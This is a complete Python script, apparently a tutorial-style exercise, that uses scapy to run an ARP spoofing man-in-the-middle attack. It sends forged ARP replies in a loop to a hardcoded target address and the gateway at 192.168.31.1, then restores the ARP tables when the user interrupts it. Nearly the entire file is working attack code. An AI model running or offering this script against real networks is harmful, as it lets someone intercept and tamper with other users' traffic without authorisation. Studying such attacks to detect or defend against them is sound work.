import scapy.all as scapy 
import time

#Function to get Macaddress of a device which is at a particualr IP
def getMac(ip):
    #Create an ARP packet giving it {YOUR-IP} as source
    arp = scapy.ARP(pdst=ip)
    #Create an Ether packect giving it dummy macaddress as source
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #Create an coupled packet with ARP and Ether
    request = broadcast/arp
    #Submit an coupled packet and receive responses
    #Fetch only answered
    #Make the srp function non-verbose
    answered = scapy.srp(request, timeout=1, verbose=False)[0]
    #Return only the macaddress
    #if 0 in answered:
    #print(answered[0][1].hwsrc)
    if(len(answered) == 1):
        return answered[0][1].hwsrc
    else:
        print("\n[+] Missed attempt to fetch macaddress of "+ip+" ...")
        return getMac(ip)
     
    #else:
    #getMac(ip)

    
#Function to send arp spoof packets
def spoof(targetip,sourceip):
    #Get macaddress of terget device
    targetMac = getMac(targetip)
    #Create ARP response packet
    packet = scapy.ARP(op=2,pdst=targetip, hwdst=targetMac, psrc=sourceip)
    #Send ARP response packet
    #Add verbose=false to stop printing default statements to the screen
    scapy.send(packet, verbose=False)

def restore(destip, sourceip):
    destMac = getMac(destip)
    sourceMac = getMac(sourceip)
    packet = scapy.ARP(op=2, pdst=destip, hwdst=destMac, psrc=sourceip, hwsrc=sourceMac)
    scapy.send(packet, verbose=False)

targetip = "192.168.31.19"
gatewayip = "192.168.31.1"
packets = 0

try:
    while True:
        packets = packets+2
        spoof(targetip, gatewayip)
        spoof(gatewayip, targetip)
        print("\r[+] Packets sent: " + str(packets), end="")
        time.sleep(2)
except KeyboardInterrupt: 
    print("\n[+] Detected ctrl+c... Remapping the ARP tables please wait..")
    restore(targetip, gatewayip)
    restore(gatewayip, targetip)

